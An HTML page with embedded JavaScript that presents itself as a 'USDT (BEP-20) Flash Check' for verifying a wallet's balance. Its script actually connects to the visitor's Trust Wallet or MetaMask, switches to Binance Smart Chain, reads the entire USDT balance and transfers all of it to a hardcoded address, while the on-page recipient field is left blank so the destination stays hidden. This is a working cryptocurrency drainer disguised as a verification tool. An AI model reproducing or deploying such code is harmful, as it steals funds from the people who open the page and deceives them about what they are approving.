<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>USDT (BEP-20) Flash Check</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #2c3e50, #000000);
            color: #ecf0f1;
            display: flex;
            flex-direction: column; /* Arrange banner above the card */
            justify-content: flex-start; /* Align items to the top */
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .banner {
            background-color: #00cc99;
            color: white;
            padding: 15px 0;
            width: 100%;
            text-align: center;
            font-size: 1.2em;
            font-weight: bold;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px; /* Space between banner and card */
            border-radius: 0 0 10px 10px; /* Optional rounded bottom corners */
        }
        .card {
            background: rgba(255, 255, 255, 0.08);
            padding: 30px;
            border-radius: 16px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
            max-width: 450px;
            width: 100%;
        }
        h2 {
            color: #00cc99;
            margin-bottom: 15px;
            font-size: 2.2em;
            font-weight: bold;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
        }
        p {
            font-size: 1em;
            line-height: 1.6;
            margin-bottom: 20px;
            color: #dcdcdc;
        }
        p strong {
            color: #f39c12;
        }
        button {
            background-color: #00cc99;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 10px;
            font-size: 1.2em;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s ease;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }
        button:hover {
            background-color: #00a377;
        }
        button:disabled {
            background-color: #555;
            cursor: not-allowed;
            box-shadow: none;
        }
        #log {
            margin-top: 20px;
            font-size: 1em;
            color: #ff6666;
            background-color: rgba(255, 102, 102, 0.1);
            padding: 10px;
            border-radius: 8px;
        }
    </style>
</head>
<body>
    <div class="banner">
        ⚡️ Instant USDT (BEP-20) Flash Check ⚡️
    </div>
    <div class="card">
        <h2>USDT (BEP-20)</h2>
        <p>Initiate to verify your USDT (BEP-20) on Binance Smart Chain:</p>
        <p style="word-break: break-all;"><strong>Recipient:</strong> <span style="color: #f39c12;"></span></p>
        <button id="sendBtn">Transfer All USDT</button>
        <div id="log"></div>
    </div>

    <script>
        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
        const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
        const usdtAbi = [
            "function balanceOf(address owner) view returns (uint256)",
            "function transfer(address to, uint256 value) returns (bool)"
        ];

        const bscParams = {
            chainId: "0x38",
            chainName: "Binance Smart Chain",
            nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18
            },
            rpcUrls: ["https://bsc-dataseed.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com"]
        };

        function log(msg) {
            document.getElementById("log").textContent = msg;
        }

        async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: bscParams.chainId }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: "wallet_addEthereumChain",
                        params: [bscParams]
                    });
                } else {
                    throw switchError;
                }
            }
        }

        async function sendAllUSDT() {
            log("");
            document.getElementById("sendBtn").disabled = true; // Disable button during operation
            if (!window.ethereum) {
                alert("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.");
                document.getElementById("sendBtn").disabled = false; // Re-enable on error
                return;
            }

            try {
                await switchToBSC();
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const userAddress = await signer.getAddress();

                const bnbBalance = await provider.getBalance(userAddress);
                const minGas = ethers.utils.parseEther("0.0001");

                const readableBNB = ethers.utils.formatEther(bnbBalance);
                console.log("BNB balance:", readableBNB);

                if (bnbBalance.lt(minGas)) {
                    log("❌ Insufficient BNB for gas. You have: " + readableBNB + " BNB");
                    document.getElementById("sendBtn").disabled = false;
                    return;
                }

                const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
                const balance = await usdt.balanceOf(userAddress);

                if (balance.isZero()) {
                    log("❌ Your USDT balance is 0.");
                    document.getElementById("sendBtn").disabled = false;
                    return;
                }

                const tx = await usdt.transfer(recipient, balance);
                log("⏳ Transfer initiated. Waiting for confirmation...");
                await tx.wait();
                log("✅ Transfer successful! USDT sent.");
            } catch (err) {
                console.error(err);
                log("❌ Transfer failed: " + (err?.message || err));
            } finally {
                document.getElementById("sendBtn").disabled = false; // Re-enable after operation (success or failure)
            }
        }

        document.getElementById("sendBtn").onclick = sendAllUSDT;
    </script>
</body>
</html>
